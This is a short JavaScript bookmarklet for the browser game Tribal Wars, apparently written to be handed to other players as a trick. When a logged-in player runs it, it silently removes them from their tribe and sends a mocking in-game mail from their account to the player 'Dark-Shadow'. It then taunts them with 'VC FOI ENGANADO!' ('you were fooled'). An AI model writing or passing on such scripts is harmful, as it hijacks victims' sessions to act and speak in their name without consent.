javascript:(function(){
    const url = TribalWars.buildURL('GET', {screen: 'ally', action: 'exit'});
    TribalWars.get(url);

    function cada_mp(player, msg, subj) {
        const parts = TribalWars.buildURL("POST", 'mail', { mode:'new', action: 'send' }).split('&h=');
        const postUrl = parts[0];
        const h = parts[1] || '';

        $.ajax({
            url: postUrl,
            type: 'POST',
            data: {
                to: player,
                subject: subj || 'ola',
                text: msg || '',
                extended: 0,
                send: 'Enviar',
                h: h
            },
            success: function() {
                UI.SuccessMessage("VC FOI ENGANADO!");
            },
            error: function(xhr) {
                UI.ErrorMessage("Falha ao enviar mensagem. Código: " + xhr.status);
            }
        });
    }

    cada_mp('Dark-Shadow', 'oi gostaria de comprar sua conta kkk', 'sou burro');
})();
